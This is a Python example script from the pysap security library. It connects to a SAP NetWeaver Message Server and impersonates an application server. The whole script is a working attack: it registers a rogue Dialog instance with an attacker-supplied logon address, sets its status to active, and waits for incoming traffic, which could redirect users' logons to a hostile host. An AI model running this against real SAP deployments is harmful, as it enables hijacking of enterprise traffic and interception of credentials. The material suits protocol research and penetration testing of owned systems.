#!/usr/bin/env python3
# encoding: utf-8
# pysap - Python library for crafting SAP's network protocols packets
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# Author:
#   Martin Gallo (@martingalloar)
#   Code contributed by SecureAuth to the OWASP CBAS project
#

# Standard imports
import logging
from argparse import ArgumentParser
from socket import timeout as SocketTimeout
# External imports
from scapy.config import conf
# Custom imports
import pysap
from pysap.SAPRouter import SAPRoutedStreamSocket
from pysap.SAPMS import (SAPMS, SAPMSPayload, SAPMSProperty, SAPMSLogon,
                         ms_domain_values_inv)


# Set the verbosity to 0
conf.verb = 0
conf.debug_dissector = True


# Command line options parser
def parse_options():

    description = "This example script connects with the Message Server service of a SAP Netweaver Application Server "\
                  "and impersonates an application server registering as a Dialog instance server."

    usage = "%(prog)s [options] -d <remote host> -l <logon address>"

    parser = ArgumentParser(usage=usage, description=description, epilog=pysap.epilog)

    target = parser.add_argument_group("Target")
    target.add_argument("-d", "--remote-host", dest="remote_host",
                        help="Remote host")
    target.add_argument("-p", "--remote-port", dest="remote_port", type=int, default=3900,
                        help="Remote port [%(default)d]")
    target.add_argument("-l", "--logon", dest="logon_address",
                        help="Logon address")
    target.add_argument("--route-string", dest="route_string",
                        help="Route string for connecting through a SAP Router")
    target.add_argument("--domain", dest="domain", default="ABAP",
                        help="Domain to connect to (ABAP, J2EE or JSTARTUP) [%(default)s]")

    misc = parser.add_argument_group("Misc options")
    misc.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Verbose output")
    misc.add_argument("-c", "--client", dest="client", default="pysap's-impersonator",
                      help="Client name [%(default)s]")
    misc.add_argument("--release", dest="release", default="720",
                      help="Reported kernel release [%(default)s]")
    misc.add_argument("--patch-number", dest="patch_number", type=int, default=70,
                      help="Reported kernel patch number [%(default)d]")
    misc.add_argument("--logon-port", dest="logon_port", type=int, default=3200,
                      help="Reported DIAG logon port [%(default)d]")
    misc.add_argument("--logon-misc", dest="logon_misc", default="LB=3",
                      help="Reported logon metadata [%(default)s]")
    misc.add_argument("--timeout", dest="timeout", type=float, default=10.0,
                      help="Connection and response timeout in seconds [%(default)s]")

    options = parser.parse_args()

    if not (options.remote_host or options.route_string):
        parser.error("Remote host or route string is required")
    if not options.logon_address:
        parser.error("Logon address is required")
    if options.domain not in ms_domain_values_inv.keys():
        parser.error("Invalid domain specified")
    if options.timeout <= 0:
        parser.error("Timeout must be positive")
    if not 0 <= options.patch_number <= 0xffff:
        parser.error("Patch number must be between 0 and 65535")
    if not 0 <= options.logon_port <= 0xffff:
        parser.error("Logon port must be between 0 and 65535")

    return options


def require_sapms_response(response, action):
    """Return the SAPMS layer or raise a clear error for unexpected packets."""
    if SAPMS not in response:
        raise ValueError("Unexpected response while %s: SAPMS layer not found" % action)
    return response[SAPMS]


# Main function
def main():
    options = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    domain = ms_domain_values_inv[options.domain]

    # Initiate the connection
    conn = SAPRoutedStreamSocket.get_nisocket(options.remote_host,
                                              options.remote_port,
                                              options.route_string,
                                              base_cls=SAPMS,
                                              connect_timeout=options.timeout,
                                              timeout=options.timeout,
                                              max_frame_length=16 << 20)
    print("[*] Connected to the message server %s:%d" % (options.remote_host, options.remote_port))

    try:
        # Set release information.
        prop = SAPMSProperty(id=7, release=options.release,
                             patchno=options.patch_number, supplvl=0,
                             platform=0)
        p = SAPMS(flag=0x01, iflag=0x01, domain=domain,
                  toname="MSG_SERVER", fromname=options.client)
        p /= SAPMSPayload(opcode=0x43, property=prop)
        print("[*] Setting release information")
        conn.send(p)

        # Perform the login enabling the DIA+BTC+ICM services.
        p = SAPMS(flag=0x08, iflag=0x08, msgtype=0x89, domain=domain,
                  toname="-", fromname=options.client)
        print("[*] Sending login packet")
        require_sapms_response(conn.sr(p), "performing login")
        print("[*] Login performed")

        # Changing the status to starting
        p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x05, domain=domain, toname="-", fromname=options.client)
        print("[*] Changing server's status to starting")
        conn.send(p)

        # Set IP address
        p = SAPMS(flag=0x01, iflag=0x01, domain=domain,
                  toname="MSG_SERVER", fromname=options.client)
        p /= SAPMSPayload(opcode=0x06, opcode_version=0x01,
                          change_ip_addressv4=options.logon_address)
        print("[*] Setting IP address")
        conn.send(p)
        print("[*] IP address request sent")

        # Set logon information
        logon = SAPMSLogon(type=2, port=options.logon_port,
                           address=options.logon_address,
                           host=options.client, misc=options.logon_misc)
        p = SAPMS(flag=0x01, iflag=0x01, msgtype=0x01, domain=domain,
                  toname="MSG_SERVER", fromname=options.client)
        p /= SAPMSPayload(opcode=0x2b, logon=logon)
        print("[*] Setting logon information")
        conn.send(p)
        print("[*] Logon information request sent")

        # Set the IP Address property
        prop = SAPMSProperty(client=options.client, id=0x03, address=options.logon_address)
        p = SAPMS(flag=0x02, iflag=0x01, domain=domain,
                  toname="-", fromname=options.client)
        p /= SAPMSPayload(opcode=0x43, property=prop)
        print("[*] Setting IP address property")
        conn.send(p)
        print("[*] IP address property request sent")

        # Changing the status to active
        p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x01, domain=domain, toname="-", fromname=options.client)
        print("[*] Changing server's status to active")
        conn.send(p)

        # Wait for connections
        while True:
            pkt = conn.recv()
            if SAPMS in pkt:
                pkt[SAPMS].show()
            else:
                pkt.show()

    except KeyboardInterrupt:
        print("[*] Cancelled by the user !")
    except SocketTimeout:
        print("[*] Response timeout reached")
    except ValueError as e:
        raise RuntimeError(str(e)) from e

    finally:
        # Send MS_LOGOUT packet
        p = SAPMS(flag=0x00, iflag=0x04, domain=domain, toname="MSG_SERVER", fromname=options.client)
        print("[*] Sending logout packet")
        try:
            conn.send(p)
        finally:
            conn.close()


if __name__ == "__main__":
    main()
